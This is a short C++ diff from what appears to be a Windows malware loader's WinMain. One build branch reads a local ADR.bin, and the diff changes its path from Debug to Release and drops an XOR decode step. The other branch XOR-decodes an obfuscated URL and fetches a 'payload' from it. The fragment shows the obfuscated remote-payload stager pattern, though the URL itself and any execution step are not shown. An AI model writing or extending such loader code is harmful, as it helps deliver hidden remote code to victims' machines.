@@ -68,9 +68,8 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_  HINSTANCE hPrevInstance, 
 		std::cin.clear();
 	}
 
-	std::ifstream ifs("D:\\dev\\repos\\project\\software\\ADR\\x64\\Debug\\ADR.bin", std::fstream::binary | std::fstream::out);
+	std::ifstream ifs("D:\\dev\\repos\\project\\software\\ADR\\x64\\Release\\ADR.bin", std::fstream::binary | std::fstream::out);
 	std::vector<char> data((std::istreambuf_iterator<char>(ifs)),(std::istreambuf_iterator<char>()));
-	data = DecodeXor(data, ADR_XOR_KEY);
 #else
 	std::vector<char> url = DecodeXor(ADR_XOR_URL, ADR_XOR_KEY);
 	std::vector<char> data = GetPayload(std::string(url.begin(), url.end()));
